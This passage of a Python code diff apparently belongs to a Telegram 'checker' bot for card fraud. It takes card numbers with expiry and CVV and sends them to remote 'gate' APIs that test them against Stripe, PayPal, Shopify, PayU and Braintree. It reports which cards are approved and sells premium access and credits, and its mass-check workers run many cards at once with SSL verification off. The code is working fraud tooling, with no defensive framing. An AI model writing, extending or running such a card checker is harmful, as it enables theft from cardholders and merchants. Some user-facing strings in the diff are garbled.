-                parse_mode="HTML", 
-                reply_markup=kb_result(), 
-                disable_web_page_preview=True
+        async with session.get(url, params={"cc": card, "site": site}) as resp:
+            try: data = await resp.json(content_type=None)
+            except: data = {"value": await resp.text()}
+    return data if isinstance(data, dict) else {"value": str(data)}
+
+async def process_gate(update: Update, context: ContextTypes.DEFAULT_TYPE,
+                       gate_key: str, gate_name: str):
+    user = update.effective_user
+    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
+        await update.message.reply_text("Bot is under maintenance. Try again later."); return
+    if not context.bot_data.get(f"{gate_key}_on", True):
+        await update.message.reply_text(f"Gate [{gate_name}] is currently OFF."); return
+    if not await require_membership(update, context): return
+
+    ud = get_user_data(user.id, context)
+    premium = is_user_premium(ud)
+    _update_user_meta(ud, user)
+
+    if gate_key in PREMIUM_GATES and not premium:
+        gate_label = {"au": "Stripe Auth (/au)", "mss": "Stripe Mass (/mss)", "mpp2": "PayPal Mass (/mpp2)"}.get(gate_key, gate_key.upper())
+        await update.message.reply_text(
+            f"[ 𖥷iТ ] ➺ Pʀᴇᴍɪᴜᴜᴍ Oɴʟʏ\n━━━━━━━━━━━━━━━━━\n"
+            f"Gᴀᴛᴇ ➺ {gate_label}\n\n"
+            f"Fʀᴇᴇ Gᴀᴛᴇꜱ:\n/chk  ➺ Stripe Charge\n/pp   ➺ PayPal Charge\n/sh   ➺ Shopify Charge\n/pyu  ➺ PayU Charge\n/b3   ➺ Braintree Auth\n\n"
+            f"Pʀᴇᴍɪᴜᴍ Gᴀᴛᴇꜱ:\n/au   ➺ Stripe Auth\n/mss  ➺ Stripe Mass\n/mpp2 ➺ PayPal Mass\n\n"
+            f"Pʀᴏ  ➺ Batman | /plan",
+            parse_mode="HTML", reply_markup=kb_upgrade(),
+        ); return
+
+    card_raw = None
+    if context.args: card_raw = context.args[0].strip()
+    elif update.message.reply_to_message and update.message.reply_to_message.text:
+        card_raw = update.message.reply_to_message.text.strip()
+    if not card_raw:
+        await update.message.reply_text(f"Uꜱᴀɢᴇ: <code>/{gate_key} cc|mm|yy|cvv</code>", parse_mode="HTML"); return
+
+    if not premium:
+        credits = ud.get("credits", 0)
+        if credits <= 0:
+            await update.message.reply_text(
+                "[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ\n━━━━━━━━━━━━━━━━━\nBuy a plan: /plan\nRefer friends for free credits: /refer",
+                reply_markup=kb_upgrade(),
+            ); return
+        ud["credits"] = credits - 1
+
+    api_url = context.bot_data.get(f"gate_url_{gate_key}") or GATE_URLS.get(gate_key, "")
+    site_url = GATE_SITES.get(gate_key, "example.com")
+    bin_num = card_raw[:6]
+    if not api_url:
+        await update.message.reply_text(f"Gate API not set. Owner: /seturl {gate_key} <url>", parse_mode="HTML"); return
+
+    msg = await update.message.reply_text("[ 𖥷iТ ] ➺ Sᴄᴀɴɴɪɴɢ...")
+    start_time = time.time()
+    uname = f"@{user.username}" if user.username else user.first_name or "User"
+    plan = ud.get("plan", "TRIAL")
+
+    try:
+        timeout = _aiohttp.ClientTimeout(total=API_TIMEOUT)
+        async with _aiohttp.ClientSession(timeout=timeout) as session:
+            results = await asyncio.gather(
+                _api_request(session, api_url, card_raw, site_url),
+                get_bin_info(bin_num), return_exceptions=True,
             )
-        except Exception: 
-            pass
-        for i in range(0, len(approved_list), 15):
-            chunk = approved_list[i:i+15]
-            chunk_lines = [f"✅ Aᴘᴘʀᴏᴠᴇᴅ ({i+1}-{min(i+15, len(approved_list))}/{len(approved_list)})"]
-            chunk_lines.append("━━━━━━━━━━━━━━━━━━")
-            for j, r in enumerate(chunk, i+1):
-                masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
-                chunk_lines.append(f"  {j}. <code>{masked}</code>\n     Gᴀᴛᴇᴡᴀʏ ➺ {r['gateway']}\n     Pʀɪᴄᴄᴇ ➺ ${r['price']}\n     Rᴇꜱᴘ ➺ {r['response'][:50]}")
-            try: 
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id, 
-                    text="\n".join(chunk_lines)[:4000], 
-                    parse_mode="HTML"
-                )
-            except Exception: 
-                pass
-            await asyncio.sleep(0.3)
+        data = results[0] if not isinstance(results[0], Exception) else {}
+        bin_data = results[1] if not isinstance(results[1], Exception) else {"error": True}
+        if isinstance(results[0], Exception): raise results[0]
 
+        raw_response = str(data.get("value") or data.get("message") or data.get("Response") or data.get("category") or "ERROR").strip()
+        is_approved = any(w in raw_response.lower() for w in ["approved", "captured", "success", "charged", "true"])
+
+        ud["total_checks"] = ud.get("total_checks", 0) + 1
+        ud["last_gate"] = gate_name
+        ud["last_card"] = card_raw[:6] + "xxxxxxxxxx"
+        ud["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M")
+        if is_approved: ud["approved_checks"] = ud.get("approved_checks", 0) + 1
+        else: ud["declined_checks"] = ud.get("declined_checks", 0) + 1
+
+        time_taken = f"{time.time() - start_time:.2f}"
+        text = build_check_result(
+            card_raw=card_raw, gate_name=gate_name, raw_response=raw_response,
+            bin_data=bin_data, username=uname, plan=plan,
+            time_taken=time_taken, is_approved=is_approved,
+        )
+        await msg.edit_text(text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
+
+    except asyncio.TimeoutError:
+        if not premium: ud["credits"] = ud.get("credits", 0) + 1
+        time_taken = f"{time.time() - start_time:.2f}"
+        text = build_check_result(
+            card_raw=card_raw, gate_name=gate_name, raw_response="Rᴇǫᴜᴇꜱᴛ Tɪᴍᴇᴏᴜᴛ", bin_data={},
+            username=uname, plan=plan, time_taken=time_taken, is_approved=False, is_timeout=True,
+        )
+        await msg.edit_text(text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
+    except Exception as e:
+        if not premium: ud["credits"] = ud.get("credits", 0) + 1
+        logger.error(f"Gate [{gate_key}] error: {e}")
+        time_taken = f"{time.time() - start_time:.2f}"
+        text = build_check_result(
+            card_raw=card_raw, gate_name=gate_name, raw_response=str(e)[:120], bin_data={},
+            username=uname, plan=plan, time_taken=time_taken, is_approved=False, is_error=True,
+        )
+        await msg.edit_text(text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
+
+async def cmd_chk(u, c):  await process_gate(u, c, "chk",  "Stripe Charge")
+async def cmd_pp(u, c):   await process_gate(u, c, "pp",   "PayPal Charge")
+async def cmd_sh(u, c):   await process_gate(u, c, "sh",   "Shopify Charge")
+async def cmd_pyu(u, c):  await process_gate(u, c, "pyu",  "PayU Charge")
+async def cmd_b3(u, c):   await process_gate(u, c, "b3",   "Braintree Auth")
+async def cmd_au(u, c):   await process_gate(u, c, "au",   "Stripe Auth")
+async def cmd_mss(u, c):  await process_gate(u, c, "mss",  "Stripe Mass")
+async def cmd_mpp2(u, c): await process_gate(u, c, "mpp2", "PayPal Mass")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 STRIPE MASS WORKERS & COMMAND
+# PREMIUM ACTIVATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async def check_single_stripe_card(session: aiohttp.ClientSession, card: str, semaphore: asyncio.Semaphore) -> dict:
-    async with semaphore:
-        api_url = f"{CHK_API_URL}?cc={card}&site={CHK_SITE}"
-        try:
-            async with session.get(api_url) as resp:
-                try: 
-                    data = await resp.json(content_type=None)
-                except Exception: 
-                    data = {"response": await resp.text()}
-                if not isinstance(data, dict): 
-                    data = {"response": str(data)}
-                raw_response = str(data.get("response", "NO RESPONSE"))
-                raw_response = re.sub(r'https?://\S+', '', raw_response).strip()
-                if not raw_response: 
-                    raw_response = "NO RESPONSE"
-                return {
-                    "card": card, 
-                    "cc_used": card, 
-                    "response": raw_response, 
-                    "status": "true" if "approved" in raw_response.lower() else "false", 
-                    "error": None
-                }
-        except asyncio.TimeoutError: 
-            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
-        except Exception as e: 
-            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}
+async def send_activation_msg(user_id: int, plan: str, days: int, context: ContextTypes.DEFAULT_TYPE) -> str:
+    receipt = gen_receipt()
+    name, username = "Unknown", None
+    try:
+        chat = await context.bot.get_chat(user_id)
+        name, username = chat.first_name or "Unknown", chat.username
+    except Exception: pass
+    ud = get_user_data(user_id, context)
+    expires_ts = time.time() + days * 86400
+    ud["name"] = name; ud["plan"] = plan.upper(); ud["expires"] = expires_ts; ud["last_receipt"] = receipt
+    if username: ud["username"] = username
+    exp_date = datetime.fromtimestamp(expires_ts).strftime("%Y-%m-%d %H:%M")
+    display_name = f"@{username}" if username else name
+    styled = get_styled_plan(plan)
+    txt = (
+        f"[ 𖥷iТ ] ➺ Aᴄᴄᴇꜱꜱ Aᴄᴛɪᴠᴀᴛᴇᴅ\n━━━━━━━━━━━━━━━━━\n"
+        f"Uꜱᴇʀ     ➺ {display_name}\nAᴄᴄᴇꜱꜱ  ➺ {styled} 👑\n"
+        f"Dᴀʏꜱ    ➺ {days}\nCʀᴇᴅɪᴛꜱ ➺ Unlimited\n"
+        f"Exᴘɪʀᴇꜱ ➺ {exp_date}\nRᴇᴄᴇɪᴘᴛ ➺ <code>{receipt}</code>\n"
+        f"━━━━━━━━━━━━━━━━━\nSave this receipt ID.\nPʀᴏ ➺ Batman"
+    )
+    try: await context.bot.send_message(chat_id=user_id, text=txt, parse_mode="HTML")
+    except Exception: pass
+    return receipt
 
-async def cmd_mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.bot_data.get("mchk_on", True):
-        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
-        return
+async def resolve_user(target: str, context: ContextTypes.DEFAULT_TYPE) -> Optional[int]:
+    target = target.strip().lstrip("@")
+    if target.lstrip("-").isdigit(): return int(target)
+    for attempt in (f"@{target}", target):
+        try: return (await context.bot.get_chat(attempt)).id
+        except Exception: continue
+    all_users = context.bot_data.get("user_data", {})
+    target_lower = target.lower()
+    for uid_str, ud in all_users.items():
+        stored = ud.get("username", "").lower().lstrip("@")
+        if stored and stored == target_lower: return int(uid_str)
+    return None
 
-    # ── Extract cards from text, reply, or file ──
-    cards = await extract_cards_from_update(update, context.bot)
-    if not cards:
-        await update.message.reply_text(
-            "⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱ ᴡᴇꜱꜱ ᴡᴏꜱꜱ, ᴏʀ ʀᴇᴘʟʏ ᴀ ꜰᴇɪᴄᴇ ᴀ ꜱᴇꜱᴢ with cards\n\n"
-            "• Sᴇɴᴅ ᴛɪʟᴇ ᴀ ꜱᴇ ᴀ ꜱᴇ ᴀꜱᴇ as document\n"
-            "• Rᴇᴘʟʏ ᴛᴏᴛᴏꜱ with /msh as caption\n\n"
-            "• Oꜱ ᴇᴄᴇᴛ ᴄᴀʀᴅꜱ ᴡᴏꜱ ꜱ\n\n"
-            "Fᴏʀᴍᴀᴍ: <code>/mchk cc|mm|yy|cvv</code>",
-            parse_mode="HTML",
-        )
-        return
-
-    if len(cards) > MAX_CARDS:
-        await update.message.reply_text(
-            f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀʀᴜɴ. Yᴏᴜᴜ ꜱᴇ ꜱᴇ: {len(cards)}", 
-            parse_mode="HTML"
-        )
-        return
-
-    if not await deduct_credits(context, update.effective_user.id, len(cards)):
-        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
-        await update.message.reply_text(
-            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", 
-            parse_mode="HTML"
-        )
-        return
-
-    msg = await update.message.reply_text(
-        f"🦇 STRIPE MASS 0$ 💳 🟢\n━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱ...", 
-        parse_mode="HTML"
+async def _grant(uid: int, plan: str, days: int, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    ud = get_user_data(uid, context)
+    ud["plan"] = plan; ud["expires"] = time.time() + days * 86400
+    display_name, display_uname = ud.get("name", "Unknown"), ud.get("username", "")
+    try:
+        chat = await context.bot.get_chat(uid)
+        display_name = chat.first_name or "Unknown"
+        if chat.last_name: display_name = f"{display_name} {chat.last_name}"
+        display_uname = chat.username or ""
+        ud["name"] = display_name
+        if display_uname: ud["username"] = display_uname
+    except Exception: pass
+    receipt = await send_activation_msg(uid, plan, days, context)
+    uname_line = f"@{display_uname}" if display_uname else display_name
+    exp_date = datetime.fromtimestamp(ud["expires"]).strftime("%Y-%m-%d %H:%M")
+    await update.message.reply_text(
+        f"━━━━━━━━━━━━━━━━━\n✅ Pʀᴇᴍɪᴜᴍ Gʀᴀɴᴛᴇᴅ\n━━━━━━━━━━━━━━━━━\n"
+        f"Uꜱᴇʀ     ➺ {uname_line}\nID       ➺ <code>{uid}</code>\n"
+        f"Pʟᴀɴ     ➺ {get_styled_plan(plan)} 👑\nDᴀʏꜱ     ➺ {days}\n"
+        f"Exᴘɪʀᴇꜱ  ➺ {exp_date}\nRᴇᴄᴇɪᴘᴛ  ➺ <code>{receipt}</code>\n━━━━━━━━━━━━━━━━━",
+        parse_mode="HTML",
     )
 
-    bin_task = get_bin_info(cards[0][:6])
-    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
-    start_time = time.time()
-
-    async with aiohttp.ClientSession(
-        timeout=aiohttp.ClientTimeout(total=CHK_TIMEOUT), 
-        connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
-    ) as session:
-        tasks = [check_single_stripe_card(session, c, semaphore) for c in cards]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-
-    try: 
-        bin_data = await bin_task if asyncio.iscoroutine(bin_task) else bin_task
-    except Exception: 
-        bin_data = {"error": True}
-
-    parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false"} for r in results]
-    approved_list = [r for r in parsed if not r.get("error") and (r["status"] == "true" or "approved" in r["response"].lower())]
-    error_list = [r for r in parsed if r.get("error")]
-
-    username = update.effective_user.first_name or "User"
-    plan_ui = get_user_plan_ui(context, update.effective_user.id)
-    bin_txt = "N/A"
-    if bin_data and not bin_data.get("error"):
-        s = str(bin_data.get("scheme", "N/A")).upper()
-        b = bin_data.get("bank", "N/A")
-        country = str(bin_data.get("country", "N/A")).upper()
-        flag = bin_data.get("country_emoji", "")
-        bin_txt = f"{s} - {b} - {flag} {country}"
-
-    lines = [
-        "🦇 STRIPE MASS 0$ 💳 🟢 ➛ Cᴏᴍᴘᴘᴛᴇᴅ",
-        "━━━━━━━━━━━━━━━━━━━━", f"📊 Tᴏᴛᴀʟ ➺ {len(parsed)}",
-        f"✅ Aᴘᴘʀᴏᴠᴇᴅ ➺ {len(approved_list)}",
-        f"❌ Dᴇᴄʟɪɴᴇᴅ ➺ {len(parsed) - len(approved_list) - len(error_list)}",
-        f"⚠️ Eʀʀᴏʀꜱꜱꜱ ➺ {len(error_list)}",
-        f"⏱️ Tɪᴍᴇ ➺ {time.time() - start_time:.2f}s",
-        "━━━━━━━━━━━━━━━━━━",
-    ]
-
-    approved_lines = []
-    if approved_list:
-        approved_lines.append(f"\n✅ Aᴘᴘʀᴏᴠᴇᴅ ({len(approved_list)})")
-        approved_lines.append("━━━━━━━━━━━━━━━━━━━━")
-        for i, r in enumerate(approved_list, 1):
-            masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
-            approved_lines.append(f"  {i}. <code>{masked}</code>\n     Rᴀᴡ ➺ {r['response'][:60]}")
-
-    footer_lines = [
-        "\n━━━━━━━━━━━━━━━━━━", f"🏦 Iɴꜰᴏ ➺ {bin_txt}",
-        "━━━━━━━━━━━━━━━━━━", f"Uꜱᴇʀ ➺ {username} 👑 ({plan_ui})",
-        "Pʀᴏ ➺ Batman⚡",
-    ]
-    full_text = "\n".join(lines + approved_lines + footer_lines)
-
-    if len(full_text) <= 4000:
-        try: 
-            await msg.edit_text(full_text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
-        except Exception: 
-            await msg.edit_text(full_text[:4000], parse_mode="HTML", reply_markup=kb_result())
-    else:
-        try: 
-            await msg.edit_text(
-                "\n".join(lines) + "\n\n📜 Fᴜʟʟ ʀᴇꜱꜱᴛ sᴇɴᴛ ʙᴇʟᴏᴡ ⬇️" + "\n".join(footer_lines), 
-                parse_mode="HTML", 
-                reply_markup=kb_result(), 
-                disable_web_page_preview=True
-            )
-        except Exception: 
-            pass
-        for i in range(0, len(approved_list), 15):
-            chunk = approved_list[i:i+15]
-            chunk_lines = [
-                f"✅ Aᴘᴘʀᴏᴠᴇᴅ ({i+1}-{min(i+15, len(approved_list))}/{len(approved_list)})", 
-                "━━━━━━━━━━━━━━━━━━"
-            ]
-            for j, r in enumerate(chunk, i+1):
-                masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
-                chunk_lines.append(f"  {j}. <code>{masked}</code>\n     Rᴛᴡ ➺ {r['response'][:60]}")
-            try: 
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id, 
-                    text="\n".join(chunk_lines)[:4000], 
-                    parse_mode="HTML"
-                )
-            except Exception: 
-                pass
-            await asyncio.sleep(0.3)
-
-
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 PAYPAL MASS WORKERS & COMMAND
+# USER COMMANDS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async def check_single_pp_card(session: aiohttp.ClientSession, card: str, semaphore: asyncio.Semaphore) -> dict:
-    async with semaphore:
-        api_url = PP_NEW_API.format(card=card)
-        try:
-            async with session.get(api_url) as resp:
-                try: 
-                    data = await resp.json(content_type=None)
-                except Exception: 
-                    data = {"status": "declined", "message": await resp.text()}
-                if not isinstance(data, dict): 
-                    data = {"status": "declined", "message": str(data)}
-                status = str(data.get("status", "declined")).lower()
-                code = str(data.get("code", ""))
-                message = str(data.get("message", "NO RESPONSE"))
-                raw = message or code or "NO RESPONSE"
-                raw = re.sub(r'https?://\S+', '', raw).strip()
-                if not raw: 
-                    raw = "NO RESPONSE"
-                return {
-                    "card": card, 
-                    "cc_used": card, 
-                    "response": raw,
-                    "status": "true" if status == "approved" else "false", 
-                    "error": None,
-                }
-        except asyncio.TimeoutError:
-            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
-        except Exception as e:
-            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}
-
-async def cmd_mpp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.bot_data.get("mpp_on", True):
-        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
-        return
-
-    # ── Extract cards from text, reply, or file ──
-    cards = await extract_cards_from_update(update, context.bot)
-    if not cards:
-        await update.message.reply_text(
-            "⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱ ᴡᴇꜱꜱ ᴡᴏᴡꜱꜱ, ᴏʀ ʀᴇᴘʟʏ ᴀ ꜰᴇɪᴄᴇ ᴀ ꜰᴇᴢ with cards\n\n"
-            "• Sᴇɴᴅ ᴛɪʟᴇ ᴀ ꜱᴇ ᴀ ꜱᴇ ᴀꜱᴢ as document\n"
-            "• Rᴇᴘʟʏ ᴛᴏᴛᴏꜱ with /mpp as caption\n"
-            "• Oꜱᴇᴄᴇᴛ ᴄᴀʀᴅꜱ ᴡᴏᴜꜱ ꜱ\n\n"
-            "Fᴏʀᴍᴀᴍ: <code>/mpp email|pass</code>",
-            parse_mode="HTML",
-        )
-        return
-
-    if len(cards) > MAX_CARDS:
-        await update.message.reply_text(
-            f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀʀᴜɴ. Yᴏᴜᴜᴇ ꜱᴇ: {len(cards)}", 
-            parse_mode="HTML"
-        )
-        return
-
-    if not await deduct_credits(context, update.effective_user.id, len(cards)):
-        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
-        await update.message.reply_text(
-            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", 
-            parse_mode="HTML"
-        )
-        return
-
-    msg = await update.message.reply_text(
-        f"🦇 {PP_GATE_NAME} 🛒 🟢\n━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱꜱ...", 
-        parse_mode="HTML"
-    )
-
-    bin_task = get_bin_info(cards[0][:6])
-    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
-    start_time = time.time()
-
-    async with aiohttp.ClientSession(
-        timeout=aiohttp.ClientTimeout(total=PP_TIMEOUT), 
-        connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
-    ) as session
+async def cmd_start(update
